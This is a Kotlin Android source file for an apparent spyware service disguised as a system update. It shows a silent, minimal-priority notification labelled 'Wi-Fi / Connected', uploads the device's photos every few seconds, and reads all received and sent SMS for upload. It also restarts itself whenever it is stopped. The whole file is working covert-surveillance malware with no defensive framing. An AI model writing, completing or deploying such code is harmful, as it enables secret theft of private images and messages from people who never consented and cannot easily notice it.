package com.sys.update

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = true

    override fun onCreate() {
        super.onCreate()
        startForegroundWithNotification()

        // 🔥 الأولوية #1 = الصور
        startImageUploadFirst()

        scope.launch {
            delay(5_000L)
            startOtherLoops()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        scope.cancel()
        try {
            val restart = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restart)
            } else {
                applicationContext.startService(restart)
            }
        } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun startForegroundWithNotification() {
        val channelId = "sys_sync_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channelId) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_MIN)
                        .apply {
                            setSound(null, null)
                            enableVibration(false)
                            setShowBadge(false)
                        }
                )
            }
        }

        val notif: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Wi-Fi")
            .setContentText("Connected")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1001, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1001, notif)
        }
    }

    private fun startImageUploadFirst() {
        // Loop A: scan + upload صور جديدة كل 3 ثواني
        scope.launch {
            while (running) {
                try { scanAndUploadImages() } catch (_: Exception) {}
                delay(3_000L)
            }
        }
        // Loop B: flush media queue كل 2 ثانية
        scope.launch {
            while (running) {
                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
                delay(2_000L)
            }
        }
        // Loop C: flush queue العادي — فقط للصور
        scope.launch {
            while (running) {
                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
                delay(10_000L)
            }
        }
    }

    private fun startOtherLoops() {
        scope.launch {
            while (running) {
                try { scanSms() } catch (_: Exception) {}
                delay(60_000L)
            }
        }
        scope.launch {
            while (running) {
                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
                delay(20_000L)
            }
        }
    }

    private fun scanAndUploadImages() {
        val images = MediaScanner.scanImages(applicationContext)
        for (img in images) {
            DataStore.appendAny(applicationContext, MediaScanner.toJson(img))
            Uploader.uploadMediaFile(applicationContext, img)
        }
    }

    private fun scanSms() {
        val msgs = SmsReader.scanAll(applicationContext) + SmsReader.scanSent(applicationContext)
        for (m in msgs) DataStore.appendAny(applicationContext, m)
    }
}
